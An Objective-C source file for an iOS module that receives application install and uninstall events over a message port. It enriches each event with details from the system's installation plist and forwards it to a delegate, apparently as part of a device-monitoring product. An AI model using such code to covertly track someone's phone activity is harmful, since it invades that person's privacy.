//
//  ALCManager.m
//  ALCManager
//
//  Created by Makara Khloth on 9/18/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "ALCManager.h"
#import "DefStd.h"
#import "EventDelegate.h"
#import "FxApplicationLifeCycleEvent.h"
#import "InstalledAppHelper.h"
#import "MediaTypeEnum.h"

static NSString* const kApplicationPlistPath= @"/User/Library/Caches/com.apple.mobile.installation.plist";

@implementation ALCManager

- (id) initWithEventDelegate:(id <EventDelegate>)aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kALCMessagePort
												 withMessagePortIPCDelegate:self];
	}
	return (self);
}

- (void) startMonitor {
	if (!mIsMonitoring) {
		[mMessagePortReader start];
		mIsMonitoring = YES;
	}
}

- (void) stopMonitor {
	if (mIsMonitoring) {
		[mMessagePortReader stop];
		mIsMonitoring = NO;
	}
}


- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	// without the autorelease pool, this function takes around 100 K of memory usage as shown in rsize
	NSAutoreleasePool *pool1 = [[NSAutoreleasePool alloc] init];			
	
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxApplicationLifeCycleEvent *alcEvent = [unarchiver decodeObjectForKey:kALCArchived];
    [unarchiver finishDecoding];
		
	NSMutableDictionary *plistContent = [NSMutableDictionary dictionaryWithContentsOfFile:kApplicationPlistPath];
	NSDictionary *userInstalledApp = [plistContent objectForKey:@"User"];
	NSDictionary *systemInstalledApp = [plistContent objectForKey:@"System"];
	
	NSDictionary *appInfo = [userInstalledApp objectForKey:[alcEvent mAppID]];
	if (!appInfo) appInfo = [systemInstalledApp objectForKey:[alcEvent mAppID]];		
	
	if (appInfo) {
		[alcEvent setMAppName:[InstalledAppHelper getAppName:appInfo]];
		[alcEvent setMAppVersion:[InstalledAppHelper getAppVersion:appInfo]];
		NSString *path = [appInfo objectForKey:@"Path"];
		[alcEvent setMAppSize:[InstalledAppHelper getAppSize:path]];
		if ([alcEvent mAppState] == kALCInstalled) {
			NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];		
			NSData *imageData = [InstalledAppHelper getIconImageData:appInfo];
			[alcEvent setMAppIconData:imageData];
			if (imageData) {
				[alcEvent setMAppIconType:PNG];
			} else {
				[alcEvent setMAppIconType:UNKNOWN_MEDIA];
			}
			[pool2 drain];
		} else {
			[alcEvent setMAppIconData:nil];
			[alcEvent setMAppIconType:UNKNOWN_MEDIA];
		}
	}
	
	DLog (@"============================================================");
	DLog (@"Application life cycle event = %@", alcEvent);
	DLog (@"============================================================");

	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:alcEvent];
	}
			
	[unarchiver release];
	[pool1 drain];
}


- (void) dealloc {
	[self stopMonitor];
	[mMessagePortReader release];
	[super dealloc];
}

@end
